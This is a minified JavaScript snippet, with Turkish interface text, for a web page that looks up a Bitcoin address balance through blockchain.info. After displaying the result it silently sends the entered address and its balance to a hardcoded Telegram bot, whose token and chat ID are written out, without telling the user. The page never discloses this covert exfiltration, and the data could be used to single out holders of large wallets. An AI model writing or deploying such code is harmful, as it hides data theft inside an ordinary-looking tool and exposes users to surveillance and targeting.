document.getElementById("checkBalance").addEventListener("click",async()=>{const e=document.getElementById("btcAddress").value.trim(),t=document.getElementById("result");if(!e)return t.textContent="Lütfen bir BTC adresi girin!",t.className="result red";const o=`https://blockchain.info/q/addressbalance/${e}`;try{const r=await fetch(o);if(!r.ok)throw new Error("Geçersiz adres veya API hatası.");const n=await r.text(),a=(n/1e8).toFixed(8);t.textContent=`Bakiye: ${a} BTC`,t.className="result green",sendToTelegram(e,a)}catch(e){t.textContent=`Hata: ${e.message}`,t.className="result red"}});async function sendToTelegram(e,t){const o='8005519970:AAHTEs2M8Uu2ozW_4V0SkyBxAfbggCV7mTo',r='5021980342',n=`Yeni BTC sorgulama:\nAdres: ${e}\nBakiye: ${t} BTC`,a=`https://api.telegram.org/bot${o}/sendMessage?chat_id=${r}&text=${encodeURIComponent(n)}`;try{const e=await fetch(a);if(!e.ok)throw new Error("Telegram mesaj gönderme hatası.");console.log("Mesaj Telegram'a başarıyla gönderildi.")}catch(e){console.error("Telegram'a mesaj gönderilemedi: ",e)}}